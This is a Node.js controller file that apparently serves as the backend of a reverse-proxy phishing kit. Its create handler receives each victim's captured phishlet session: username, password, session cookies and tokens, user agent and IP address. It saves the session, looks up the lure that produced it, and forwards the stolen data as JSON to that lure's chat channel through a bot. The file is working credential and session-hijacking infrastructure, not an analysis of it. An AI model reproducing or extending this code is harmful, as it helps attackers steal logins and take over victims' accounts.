const sessionService = require("../service/session");
const lureService = require("../service/lure");
const bot = require("../service/bot");

const resolve = (data, res) => {
  return res.status(200).send({
    success: true,
    data,
  });
};

const reject = (err, res) => {
  console.log("User Service Error:", err);
  return res.status(500).send({
    success: false,
    message: err.message || "Some error occurred",
  });
};

exports.create = (req, res) => {
  console.log(req.body);
  const {
    phishlet,
    landing_url,
    username,
    password,
    body_tokens,
    http_tokens,
    tokens,
    session_id,
    useragent,
    remote_addr,
  } = req.body;
  sessionService
    .create({
      phishlet,
      landingUrl: landing_url,
      username,
      password,
      bodyToken: body_tokens,
      httpToken: http_tokens,
      cookieToken: tokens,
      sessionId: session_id,
      userAgent: useragent,
      remoteAddr: remote_addr,
    })
    .then((data) => {
      lureService
        .findOne({ landingUrl: data.landingUrl })
        .then((lure) => {
          try {
            data = data.toJSON();
            delete data.id;
            delete data.updatedAt;
            bot.sendMessage(lure.channel, JSON.stringify(data));
            resolve({}, res);
          } catch (err) {
            reject(err, res);
          }
        })
        .catch((err) => reject(err, res));
    })
    .catch((err) => reject(err, res));
};

exports.delete = (req, res) => {
  sessionService
    .remove(req.body.id)
    .then((data) => resolve(data, res))
    .catch((err) => reject(err, res));
};
